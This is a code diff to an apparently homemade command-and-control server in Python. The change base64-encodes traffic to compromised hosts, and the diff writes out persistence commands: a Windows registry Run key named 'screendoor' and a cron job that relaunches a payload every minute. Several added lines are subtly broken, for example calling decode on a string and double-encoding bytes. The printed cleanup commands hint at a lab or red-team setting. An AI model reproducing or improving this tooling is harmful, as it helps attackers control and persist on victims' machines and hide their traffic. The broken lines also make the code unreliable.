@@ -138,19 +138,22 @@ def exeplant():
 
 def comm_in(targ_id):
     print("[+] Awaiting response...")
-    response = targ_id.recv(1024).decode()
+    response = targ_id.recv(4096).decode()
+    response = response.decode().strip()
     return response
 
 def comm_out(targ_id, message):
     message = str(message)
-    targ_id.send(message.encode())
+    message = base64.b64encode(bytes(message, encoding="utf8"))
+    targ_id.send(message)
 
 def target_comm(targ_id):
     while True:
         message = input(f"{targets[num][3]}/{targets[num][1]}@> ")
         comm_out(targ_id, message)
         if message == "exit":
-            targ_id.send(message.encode())
+            message = base64.b64encode(message.encode())
+            targ_id.send(message)
             targ_id.close()
             targets[num][7] = "Dead"
             break
@@ -165,14 +168,17 @@ def target_comm(targ_id):
             payload_name = input("[+] Enter name of payload to add to autorun: ")
             if targets[num][6] == 1:
                 persist_command_1 = f"cmd.exe /c copy {payload_name} C:\\Users\\Public"
+                persist_command_1 = base64.b64encode(persist_command_1,encode())
                 targ_id.send(persist_command_1.encode())
                 persist_command_2 = f"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}"
+                persist_command_2 = base64.b64encode(persist_command_2.encode())
                 targ_id.send(persist_command_2.encode())
                 print("[+] Persistence technique completed.")
                 print("[+] Run this command to clean up the registry: \n reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v screendoor /f")
 
             if targets[num][6] == 2:
                 persist_command = f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -'
+                persist_command = base64.b64encode(persist_command.encode())
                 targ_id.send(persist_command.encode())
                 print("[+] Persistence technique completed.")
                 print("[+] Run this command to clean up the crontab: \n crontab -r")
@@ -200,8 +206,11 @@ def comm_handler():
         try:
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
+            username = base64.b64decode(username).decode()
             admin = remote_target.recv(1024).decode()
+            admin = base64.b64decode(admin).decode()
             op_sys = remote_target.recv(1024).decode()
+            op_sys = base64.b64decode(op_sys).decode()
 
             if admin == 1:
                 admin_val = "Yes"
@@ -256,7 +265,8 @@ def pshell_cradle():
 
 def kill_sig(targ_id, message):
     message = str(message)
-    targ_id.send(message.encode())
+    message = base64.b64encode(bytes(message, encoding="utf8"))
+    targ_id.send(message)
 
 
 
